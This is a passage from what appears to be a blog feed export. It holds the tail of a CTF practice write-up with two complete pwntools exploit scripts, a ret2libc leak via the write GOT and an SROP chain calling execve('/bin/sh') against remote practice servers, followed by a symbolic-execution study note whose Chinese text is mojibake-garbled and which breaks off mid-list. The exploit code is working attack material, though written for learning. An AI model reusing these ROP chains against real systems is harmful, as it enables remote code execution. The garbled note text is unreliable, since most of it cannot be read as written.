<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;node5.buuoj.cn:28090&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./level3_x64&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">pop_rdi_ret = 0x00000000004006b3</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]</span><br><span class="line">pop_rsi_r15_ret = 0x00000000004006b1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = b&#x27;a&#x27; * (0x80 + 8) + p64(pop_rdi_ret) + p64(1)</span><br><span class="line">p1 += p64(pop_rsi_r15_ret) + p64(write_got) + p64(0)</span><br><span class="line">p1 += p64(write_plt) + p64(main_addr)</span><br><span class="line">io.sendline(p1)</span><br><span class="line"></span><br><span class="line">write_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;write_addr   ---&gt;   &#x27; + hex(write_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(&#x27;write&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * (0x80 + 8) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="x0b-ciscn_2019_es_7">0x0B ciscn_2019_es_7</h1>
<p>SROP,pwntoolsçš„é›†æˆçœŸé¦™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;node5.buuoj.cn:28329&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./ciscn_2019_es_7&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">vuln_addr = 0x4004f1</span><br><span class="line">sig_return = 0x4004da</span><br><span class="line">execve_addr = 0x4004e2</span><br><span class="line">syscall_ret = 0x400517</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">bin_sh = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload = bin_sh.ljust(0x10,b&#x27;a&#x27;)</span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&quot;stack_addr   =&gt;   &quot;,hex(stack_addr))</span><br><span class="line"></span><br><span class="line">bin_sh_addr = stack_addr - 328</span><br><span class="line">print(&quot;bin_sh_addr   =&gt;   &quot;,hex(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload  = bin_sh.ljust(0x10,b&#x27;a&#x27;)</span><br><span class="line">payload += p64(sig_return)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = bin_sh_addr</span><br><span class="line">sigframe.rsi = 0</span><br><span class="line">sigframe.rdx = 0</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line"></span><br><span class="line">payload += bytes(sigframe)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="x0c">0x0C</h1>
]]></content>
      <categories>
        <category>CTF_practice</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Symbolic Execution Leaning Note (1) -- Basis</title>
    <url>/2023/09/30/Symbolic%20Execution%20Leaning%20Note%20(1)%20--%20Basis/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
è¿ˆå‘è‡ªåŠ¨åŒ–çš„ç¬¬ä¸€æ­¥â€”â€”
</blockquote>
<span id="more"></span>
<h1 id="x00-åŸºæœ¬æ¨¡å‹">0x00 åŸºæœ¬æ¨¡å‹</h1>
<ul>
<li><p><strong>æ¦‚è¿°</strong><br />
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="type">void</span> <span class="title function_">sum</span><span class="params">(a,b)</span>&#123;</span><br><span class="line"><span class="number">2</span>    <span class="type">int</span> x = a;</span><br><span class="line"><span class="number">3</span>    <span class="type">int</span> y = b;</span><br><span class="line"><span class="number">4</span>    <span class="type">int</span> z = x + y;</span><br><span class="line"><span class="number">5</span>    <span class="keyword">return</span> z;</span><br><span class="line"><span class="number">6</span>  &#125;</span><br></pre></td></tr></table></figure> è°ƒç”¨<span
class="math inline">\(sum(1,2)\)</span>ï¼Œå­¦è¿‡Cè¯­è¨€çš„éƒ½çŸ¥é“ä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…<br />
ä½†å¦‚æœæˆ‘è°ƒç”¨<span
class="math inline">\(sum(a1,a2)\)</span>ï¼Œå¹¶ä¸”æˆ‘åœ¨è¿™ä¹‹å‰å¹¶æœªå£°æ˜a1ï¼Œa2å‘¢ï¼Ÿ<br />
å…ˆä¸è¦ç”¨Cè¯­è¨€çš„æ€è·¯æ¥è€ƒè™‘äº†ï¼Œæˆ‘ä»¬ç§°è¿™ç§æƒ…å†µä¸º<strong>ç¬¦å·æ‰§è¡Œ(Symbolic
Execution)</strong>ï¼Œå…·ä½“ä¼šå‘ç”Ÿä»€ä¹ˆæˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹</p></li>
<li><p><strong>åŸºæœ¬æ€æƒ³</strong></p>
<ol type="1">
<li>ä½¿ç”¨ç¬¦å·å˜é‡ä»£æ›¿å…·ä½“å€¼ä½œä¸ºç¨‹åºæˆ–å‡½æ•°çš„å‚æ•°ï¼Œå¹¶æ¨¡æ‹Ÿæ‰§è¡Œç¨‹åºä¸­çš„æŒ‡ä»¤ï¼Œå„æŒ‡ä»¤çš„æ“ä½œéƒ½åŸºäºç¬¦å·å˜é‡è¿›è¡Œï¼Œå…¶ä¸­æ“ä½œæ•°çš„å€¼ç”±ç¬¦å·å’Œå¸¸é‡ç»„æˆçš„è¡¨è¾¾å¼æ¥è¡¨ç¤º
<ol type="1">
<li>ç¬¦å·å˜é‡æ˜¯ä»€ä¹ˆï¼Ÿ
<ol type="1">
<li>è¯»è€…å¯ä»¥å°†ç¬¦å·æ‰§è¡Œè§†ä¸ºç¨‹åºå…·ä½“æ‰§è¡Œçš„è‡ªç„¶æ‰©å±•ï¼Œç¬¦å·å˜é‡ä½¿å¾—ç¨‹åºæ‰§è¡Œå˜å¾—ä¸ç¡®å®šï¼Œå½“æˆ‘ä»¬ç»™ä¸€ç³»åˆ—ç¬¦å·èµ‹ä¸€ä¸ªç¡®å®šçš„å€¼æ—¶ï¼Œç¬¦å·æ‰§è¡Œå°±æˆä¸ºäº†ç¨‹åºå…·ä½“æ‰§è¡Œï¼ˆi.e.
ç¨‹åºçš„ä¸€æ¬¡å…·ä½“æ‰§è¡Œå¯ä»¥è§†ä¸ºç¬¦å·æ‰§è¡Œçš„ä¸€æ¬¡å®ä¾‹ï¼‰</li>
</ol></li>
<li>æ“ä½œæ•°æ˜¯ä»€ä¹ˆï¼Ÿ</li>
</ol></li>
<li>å¯¹äºä»»æ„ç¨‹åºï¼Œå…¶æ‰§è¡Œæµç¨‹æ˜¯ç”±æ‰§è¡Œåºåˆ—çš„æ‰§è¡Œè¯­ä¹‰æ§åˆ¶çš„
<ol type="1">
<li>æ‰§è¡Œè¯­ä¹‰ï¼š
<ol type="1">
<li>å˜é‡å®šä¹‰è¯­å¥å¯¹æ•°æ®å¯¹è±¡çš„æè¿° <code>int a;</code></li>
<li>å£°æ˜è¯­å¥å¯¹ç¨‹åºæ•°æ®å¯¹è±¡çš„ä¿®æ”¹ <code>a = 10;</code></li>
<li>æ¡ä»¶è¯­å¥å¯¹ç¨‹åºæ‰§è¡Œæµç¨‹çš„æ§åˆ¶</li>
</ol></li>
</ol></li>
<li>å½“ç¨‹åºçš„è¾“å…¥å‚æ•°ç¡®å®šæ—¶ï¼Œå…¶æŒ‡ä»¤åºåˆ—è¢«å›ºå®šï¼Œå› æ­¤ç¨‹åºæ‰§è¡Œè¯­ä¹‰å’Œæ§åˆ¶æµä¹Ÿè¢«å›ºå®š</li>
</ol></li>
<li><p><strong>ç¨‹åºè¯­è¨€å®šä¹‰</strong></p>
<ol type="1">
<li>James C. Kingåœ¨æå‡ºç¬¦å·æ‰§è¡ŒæŠ€æœ¯çš„åŒæ—¶ï¼Œä¹Ÿä¸ºå…¶é™å®šäº†ç†æƒ³çš„é€‚ç”¨åœºæ™¯ï¼š
<ol type="1">
<li>ç†æƒ³æ¨¡å‹ä¸­ç¨‹åºåªå¤„ç†â€œæœ‰ç¬¦å·æ•´æ•°â€</li>
<li>ç¨‹åºâ€œæ‰§è¡Œæ•°â€è§„æ¨¡æœ‰é™</li>
<li>å¯ä»¥å¤„ç†ç¨‹åºå†…æ‰€æœ‰ifæ¡ä»¶è¯­å¥çš„çº¦æŸè¡¨è¾¾å¼</li>
</ol></li>
<li>åŸºäºç¬¦å·æ‰§è¡ŒæŠ€æœ¯çš„ç†æƒ³åœºæ™¯ï¼Œå¯¹ç¨‹åºè¯­è¨€åšå¦‚ä¸‹å®šä¹‰
<ol type="1">
<li>ç¨‹åºå˜é‡ç±»å‹ï¼šåªåŒ…å«â€œæœ‰ç¬¦å·æ•´æ•°â€</li>
<li>ç¨‹åºè¯­å¥ç±»å‹
<ol type="1">
<li>ç®€å•å£°æ˜è¯­å¥ï¼Œå¦‚<code>a = 3</code></li>
<li>ifæ¡ä»¶è¯­å¥(åŒ…æ‹¬then å’Œ else)</li>
<li>æ— æ¡ä»¶è·³è½¬è¯­å¥ï¼Œå¦‚gotoè¯­å¥</li>
<li>å˜é‡æ“ä½œè¯­å¥ï¼šå¦‚readå‡½æ•°ã€åŸºæœ¬æ•´æ•°è¿ç®—æ“ä½œï¼ˆ+ã€-ã€*ï¼‰</li>
</ol></li>
<li>ç¨‹åºè¯­ä¹‰
<ol type="1">
<li>ç®€å•å£°æ˜è¯­å¥ã€æ— æ¡ä»¶è·³è½¬è¯­å¥å’Œå˜é‡æ“ä½œè¯­å¥ï¼Œåªæ˜¯å°†ç¨‹åºä¸­çš„å…·ä½“å€¼æ›¿æ¢ä¸ºäº†ç¬¦å·</li>
<li>è€Œifæ¡ä»¶è¯­å¥ä¸­ï¼Œå°†å…·ä½“å€¼æ›¿æ¢ä¸ºäº†ç¬¦å·ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•åˆ¤æ–­ifè¯­å¥ä¸­çš„çœŸå€¼ï¼Œå°±ä¸èƒ½ç¡®å®šæ¡ä»¶åˆ†æ”¯çš„èµ°å‘ï¼Œè¿™æ˜¯ç¬¦å·æ‰§è¡ŒæŠ€æœ¯å¯¹ç¨‹åºæ‰§è¡Œè¯­ä¹‰çš„æœ€å¤§æ”¹å˜ï¼Œä¹Ÿæ˜¯ç¬¦å·æ‰§è¡Œä¸å…·ä½“æ‰§è¡Œçš„å…³é”®åŒºåˆ«</li>
</ol></li>
</ol></li>
</ol></li>
<li><p><strong>ç¨‹åºæ‰§è¡ŒçŠ¶æ€</strong></p>
<ul>
<li>PC
<ol type="1">
<li>ä¸ºäº†è§£å†³â€œåˆ†æ”¯èµ°å‘ä¸ç¡®å®šâ€çš„é—®é¢˜ï¼ŒKingä¸ºç¨‹åºçŠ¶æ€æ–°æ·»åŠ äº†ä¸€ä¸ªå˜é‡ï¼š<strong>è·¯å¾„çº¦æŸæ¡ä»¶
pc(path
constraint)</strong>ï¼Œåœ¨æ¯ä¸ªifæ¡ä»¶è¯­å¥å¤„å¹¶æ²¡æœ‰å®é™…å†³å®šç¨‹åºæ‰§è¡Œå“ªä¸ªåˆ†æ”¯ï¼Œè¿™å°±éœ€è¦ç¬¦å·æ‰§è¡Œå¼•æ“<strong>ä¸»åŠ¨é€‰æ‹©æ‰§è¡Œåˆ†æ”¯</strong>å¹¶<strong>è®°å½•æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹</strong>ï¼Œpcå°±è¾…åŠ©å®Œæˆäº†è¿™é¡¹å·¥ä½œ</li>
<li>Simplyï¼Œpcå°±æ˜¯ç¬¦å·æ‰§è¡Œè¿‡ç¨‹ä¸­å¯¹è·¯å¾„ä¸Šæ¡ä»¶åˆ†æ”¯èµ°å‘çš„é€‰æ‹©æƒ…å†µ</li>
<li>æ¥çœ‹ä¸€æ®µç¤ºä¾‹ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if1: a1 &gt;= 0</span><br><span class="line">if2: a1+2*a2 &gt;= 0</span><br><span class="line">if3: a3&gt;= 0</span><br></pre></td></tr></table></figure></li>
<li>å‡è®¾ä¸Šè¿°ä¸‰ä¸ªåˆ†æ”¯ä¸­é€‰æ‹©äº†if1:true if2:true
if3:falseï¼Œpcè¡¨ç¤ºä¸º<code>pc = (a1 &gt;= 0 &amp;&amp; a1+2*a2 &gt;= 0 &amp;&amp; ~(a3 &gt;= 0))</code>ï¼Œç”±æ­¤å¯è§ï¼Œpcæ˜¯ä¸€ä¸ªboolè¡¨è¾¾å¼</li>
</ol></li>
<li>ç¬¦å·æ‰§è¡Œå¼•æ“
<ul>
<li>å½“ç¬¦å·æ‰§è¡Œåˆ° if(q) æ—¶ï¼Œpc æœ‰å¯èƒ½åŒ…å«qï¼ˆ1ï¼‰ï¼Œä¹Ÿå¯èƒ½åŒ…å«
~qï¼ˆ2ï¼‰ï¼Œå¦‚æœç¬¦å·æ‰§è¡Œå¼•æ“é€‰æ‹©è¿›å…¥thenåˆ†æ”¯ï¼Œåˆ™ pc
è¡¨ç°ä¸ºï¼ˆ1ï¼‰çš„å½¢å¼ï¼Œå¦‚æœç¬¦å·æ‰§è¡Œå¼•æ“é€‰æ‹©è¿›å…¥elseåˆ†æ”¯ï¼Œ åˆ™ pc
è¡¨ç°ä¸ºï¼ˆ2ï¼‰çš„å½¢å¼</li>
<li>è€Œæˆ‘ä»¬å¸Œæœ›ä¸¤æ¡åˆ†æ”¯éƒ½è¢«æµ‹è¯•ï¼Œæ‰€ä»¥ç¬¦å·æ‰§è¡Œå¼•æ“æ‰§è¡Œåˆ°ifæ¡ä»¶è¯­å¥æ—¶ï¼Œç¬¦å·æ‰§è¡Œéœ€è¦åˆ›å»ºä¸¤ä¸ªâ€œå¹¶è¡Œâ€çš„æ‰§è¡Œè¿‡ç¨‹</li>
<li>æ¯ä¸ªå’Œç¬¦å·å˜é‡ç›¸å…³çš„ifæ¡ä»¶è¯­å¥éƒ½ä¼šä¸ºpcè´¡çŒ®ä¸€ä¸ªå†³å®šç¨‹åºæ‰§è¡Œèµ°å‘çš„è¡¨è¾¾å¼ï¼Œæœ€åè¦ç¡®å®špcå¯¹åº”è·¯å¾„çš„ç¨‹åºè¾“å…¥å‚æ•°ï¼Œåªéœ€è¦ç”¨çº¦æŸæ±‚è§£å™¨å¯¹pcè¿›è¡Œæ±‚è§£</li>
</ul></li>
</ul></li>
<li><p><strong>ç¬¦å·æ‰§è¡Œæ ‘</strong></p>
<ol type="1">
<li>å®šä¹‰ï¼šç”¨æ¥æè¿°ç¨‹åºæ‰§è¡Œè·¯å¾„çš„æ ‘å½¢ç»“æ„</li>
<li>å†…å®¹ï¼šä¸€ä¸ªèŠ‚ç‚¹å¯¹åº”ç¨‹åºä¸­çš„ä¸€æ¡è¯­å¥ï¼Œè¿˜å¯ä»¥åŒ…å«æŒ‡ä»¤è®¡æ•°ã€PCã€å˜é‡å€¼ç­‰ç¨‹åºæ‰§è¡ŒçŠ¶æ€ä¿¡æ¯(æ²¡æ‰¾åˆ°åˆé€‚çš„å›¾ï¼Œå°±å…ˆæ”¾ä¸€å¼ ä¸å¸¦Cä»£ç çš„)
<img
src="https://img-blog.csdnimg.cn/792e3c5258b74c3bb8a021f3d7d5f1fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qix5bKb44Gu6bK4,size_20,color_FFFFFF,t_70,g_se,x_16" /></li>
</ol></li>
<li><p><strong>çº¦æŸæ±‚è§£</strong></p>
<ol type="1">
<li>å®šä¹‰ï¼š
<ol type="1">
<li>ç»™å®šä¸€ä¸ªä¸‰å…ƒç»„&lt;V,D,C&gt;,å…¶ä¸­ï¼š
<ol type="1">
<li>V: å˜é‡çš„æœ‰é™é›†åˆ<br />
</li>
<li>D: å˜é‡çš„è®ºåŸŸï¼Œå˜é‡å¯èƒ½å–å€¼çš„æœ‰é™é›†åˆ<br />
</li>
<li>C: æœ‰é™çº¦æŸé›†åˆï¼ŒæŸä¸ªçº¦æŸå…³ç³»<span
class="math inline">\(C_i\)</span>åŒ…å«Vä¸­ä¸€ä¸ªæˆ–å¤šä¸ªå˜é‡ï¼Œè‹¥<span
class="math inline">\(C_i\)</span>åŒ…å«kä¸ªå˜é‡ï¼Œåˆ™ç§°å…¶ä¸ºåœ¨è¿™kä¸ªå˜é‡é›†åˆä¸Šçš„kå…ƒçº¦æŸ<br />
</li>
</ol></li>
<li>çº¦æŸæ±‚è§£å°±æ˜¯æ‰¾åˆ°çº¦æŸé—®é¢˜çš„ä¸€ä¸ªè§£ï¼Œè¯¥è§£å¯¹å˜é‡é›†åˆä¸­æ‰€æœ‰å˜é‡éƒ½èµ‹ä¸€ä¸ªå–è‡ªå…¶è®ºåŸŸçš„å€¼ï¼Œå¹¶ä¸”è¿™äº›å˜é‡çš„å€¼æ»¡è¶³è¯¥é—®é¢˜çš„æ‰€æœ‰çº¦æŸæ¡ä»¶<br />
</li>
<li>å¯¹äºçº¦æŸé—®é¢˜<span class="math inline">\(P =
&lt;V,D,C&gt;\)</span>ï¼Œè‹¥Pè‡³å°‘å­˜åœ¨ä¸€ä¸ªè§£ï¼Œåˆ™ç§°Pä¸ºå¯æ»¡è¶³çš„ï¼Œå¦åˆ™ç§°å…¶ä¸ºä¸å¯æ»¡è¶³çš„<br />
</li>
</ol></li>
<li>åˆ†ç±»:
<ol type="1">
<li>SAT(The Satisfiability problem, å¯æ»¡è¶³æ€§é—®é¢˜)
<ol type="1">
<li>å®šä¹‰ï¼šæ±‚è§£ç”±<strong>å¸ƒå°”å˜é‡é›†åˆ</strong>æ‰€æ„æˆçš„å¸ƒå°”å‡½æ•°ï¼Œæ˜¯å¦å­˜åœ¨å˜é‡çš„ä¸€ç§åˆ†å¸ƒä½¿å¾—è¯¥å‡½æ•°çš„å–å€¼ä¸º1<br />
</li>
<li>ç¼ºé™·ï¼šâ‘ åªèƒ½è§£å†³å‘½é¢˜é€»è¾‘å…¬å¼é—®é¢˜ï¼Œå¾ˆå¤šå®é™…é—®é¢˜è½¬åŒ–ä¸æˆå‘½é¢˜é€»è¾‘é—®é¢˜â‘¡å¿…é¡»ç”¨å¸ƒå°”å˜é‡æ¥è¡¨ç¤ºï¼Œå°†å®é™…é—®é¢˜è½¬åŒ–ä¸ºå¸ƒå°”å‡½æ•°å¼€é”€å¤§ï¼Œè½¬æ¢åçš„å‡½æ•°ä¹Ÿæå…¶å¤æ‚<br />
</li>
</ol></li>
<li>SMT(Satisfiability Modulo Theories, å¯æ»¡è¶³æ€§æ¨¡ç†è®º)
<ol type="1">
<li>å®šä¹‰ï¼šå°†SATåªèƒ½æ±‚è§£å‘½é¢˜é€»è¾‘å…¬å¼é—®é¢˜æ‰©å±•ä¸ºå¯ä»¥è§£å†³ä¸€é˜¶é€»è¾‘æ‰€è¡¨è¾¾çš„å…¬å¼ã€‚åŒ…å«å¤šç§ç†è®ºã€‚
<ol type="1">
<li>ä»€ä¹ˆæ˜¯ä¸€é˜¶é€»è¾‘</li>
</ol></li>
</ol></li>
</ol></li>
</ol></li>
<li><p><strong>å›åˆ°å¼€å§‹çš„å‡½æ•°</strong></p></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="type">void</span> <span class="title function_">sum</span><span class="params">(a,b)</span>&#123;</span><br><span class="line"><span class="number">2</span>    <span class="type">int</span> x = a;</span><br><span class="line"><span class="number">3</span>    <span class="type">int</span> y = b;</span><br><span class="line"><span class="number">4</span>    <span class="type">int</span> z = x + y;</span><br><span class="line"><span class="number">5</span>    <span class="keyword">return</span> z;</span><br><span class="line"><span class="number">6</span>  &#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å°†å…¶å†™ä¸º<em>ç±»PL/1è¯­è¨€</em> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  SUM: PROCEDURE(A,B);</span><br><span class="line">2    X&lt;-A;</span><br><span class="line">3    Y&lt;-B;</span><br><span class="line">4    Z&lt;-X+Y;</span><br><span class="line">5    RETURN(Z);</span><br><span class="line">6  END;</span><br></pre></td></tr></table></figure></p>
<p>æˆ‘ä»¬åœ¨è°ƒç”¨<span
class="math inline">\(sum(1,2)\)</span>åï¼Œå¯ä»¥åˆ—ä¸€ä¸ªè¡¨æ ¼æ¥è§‚å¯Ÿç¨‹åºæµ<br />
<span class="math display">\[
\def\arraystretch{.7}
   \begin{array}{|c|c|c|c|c|c|c|}
   \hline
    Line &amp; X &amp; Y &amp; Z &amp; A &amp; B &amp; pc \cr \hline
    1 &amp; ? &amp; ? &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    2 &amp; 1 &amp; ? &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    3 &amp; 1 &amp; 2 &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    4 &amp; 1 &amp; 2 &amp; 3 &amp; 1 &amp; 2 &amp; true \cr \hline
\end{array}
\]</span> &gt; Line 5æ˜¯return 3 (Katexä¸æ”¯æŒåˆå¹¶å•å…ƒæ ¼ï¼Œç†è§£ä¸‡å²)</p>
<p>æˆ‘ä»¬åœ¨è°ƒç”¨<span
class="math inline">\(sum(a1,a2)\)</span>åï¼Œå°±æ˜¯æŠŠå…·ä½“å€¼æ¢æˆäº†å¯¹åº”çš„ç¬¦å·
<span class="math display">\[
\def\arraystretch{.7}
   \begin{array}{|c|c|c|c|c|c|c|}
   \hline
    Line &amp; X &amp; Y &amp; Z &amp; A &amp; B &amp; pc \cr \hline
    1 &amp; ? &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    2 &amp; a1 &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    3 &amp; a1 &amp; a2 &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    4 &amp; a1 &amp; a2 &amp; a3 &amp; a1 &amp; a2 &amp; true \cr \hline
\end{array}
\]</span></p>
<blockquote>
<p>Line 5æ˜¯return (a1+a2)</p>
</blockquote>
<p>æ—¢ç„¶ç¬¦å·æ‰§è¡Œä¸å…·ä½“å€¼æ‰§è¡Œæœ€å¤§çš„åŒºåˆ«æ˜¯ifæ¡ä»¶è¯­å¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†™ä¸€ä¸ªå¸¦æœ‰ifè¯­å¥çš„ç¨‹åºæ¥çœ‹ä¸€ä¸‹
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 1: POWER: PROCEDURE(X, Y);</span><br><span class="line"> 2:     Z = 1;</span><br><span class="line"> 3:     J = 1;</span><br><span class="line"> 4:</span><br><span class="line"> 5: LAB: IF Y &gt;= J THEN</span><br><span class="line"> 6:         DO;</span><br><span class="line"> 7:             Z = Z * X;</span><br><span class="line"> 8:             J = J + 1;</span><br><span class="line"> 9:             GO TO LAB;</span><br><span class="line">10:         END;</span><br><span class="line">11:</span><br><span class="line">12:     RETURN(Z);</span><br><span class="line">13: END POWER;</span><br></pre></td></tr></table></figure></p>
<p>è¿™ä¸ªå‡½æ•°è½¬åŒ–ä¸ºCå°±æ˜¯</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">power</span><span class="params">(<span class="type">int</span> X, <span class="type">int</span> Y)</span> &#123;</span><br><span class="line">    <span class="type">int</span> Z = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> J = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (Y &gt;= J) &#123;</span><br><span class="line">        Z *= X;</span><br><span class="line">        J++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬ç»§ç»­ç”¨è¡¨æ ¼çš„æ ¼å¼æ¥çœ‹</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        1 &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
        2 &amp; 1 &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
        3 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; true \cr \hline
\end{array}
\]</span></p>
<p>å‰ä¸‰è¡Œéƒ½å¾ˆæ­£å¸¸ï¼Œç›´åˆ°ç¬¬äº”è¡Œè¿›è¡Œåˆ¤æ–­<br />
1. å¤„ç†åˆ¤æ–­è¯­å¥ <code>Y&gt;=J</code> å¾—åˆ°çº¦æŸæ¡ä»¶ <code>a2&gt;=1</code>
2. ç”Ÿæˆä¸¤ä¸ªåˆ†æ”¯çš„è·¯å¾„çº¦æŸæ¡ä»¶ï¼š<br />
- (a2&gt;=1) <span class="math inline">\(\subset\)</span> true -
~(a2&gt;=1) <span class="math inline">\(\subset\)</span> true 3.
ä¸¤ä¸ªè·¯å¾„çº¦æŸéƒ½å¯æ»¡è¶³ï¼Œåˆ†åˆ«å¯¹ä¸¤ä¸ªè·¯å¾„è¿›è¡Œæ¢ç´¢</p>
<p>å¯¹äºåˆ†æ”¯: ~(a2&gt;=1) <span class="math inline">\(\subset\)</span>
true</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        5 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; ~(a2&gt;=1) \cr \hline
\end{array}
\]</span></p>
<p>ç„¶åé©¬ä¸Šåœ¨Line 12å¤„å¾—åˆ°(return 1 when a2&lt;1)ï¼Œæ¢ç´¢å®Œæˆ</p>
<p>å¯¹äºåˆ†æ”¯: (a2&gt;=1) <span class="math inline">\(\subset\)</span>
true</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        5 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
        7 &amp; a1 &amp; 1 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
        8 &amp; a1 &amp; 2 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
\end{array}
\]</span></p>
<p>ç„¶åå› ä¸ºLine
9ï¼Œç¨‹åºä¼šè·³å›ç¬¬å››è¡Œç»§ç»­åˆ¤æ–­è¯­å¥ï¼Œä¼šäº§ç”Ÿä¸¤ä¸ªæ–°çš„åˆ†æ”¯ï¼Œå°±é™·å…¥äº†æ— é™å¾ªç¯ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚</p>
<p>å¯æ˜¯å¾ªç¯åœ¨ä¸€ä¸ªç¨‹åºä¸­ç»å¸¸å‡ºç°ï¼Œè¯¥æ€ä¹ˆè§£å†³è¿™ä¸€é—®é¢˜ï¼Ÿæˆ‘ä»¬æ¥ç€å¾€åçœ‹</p>
<h1 id="x01-åŠ¨æ€ç¬¦å·æ‰§è¡ŒæŠ€æœ¯dse">0x01 åŠ¨æ€ç¬¦å·æ‰§è¡ŒæŠ€æœ¯(DSE)</h1>
<ul>
<li><strong>åŸºæœ¬æ€æƒ³</strong>
<ol type="1">
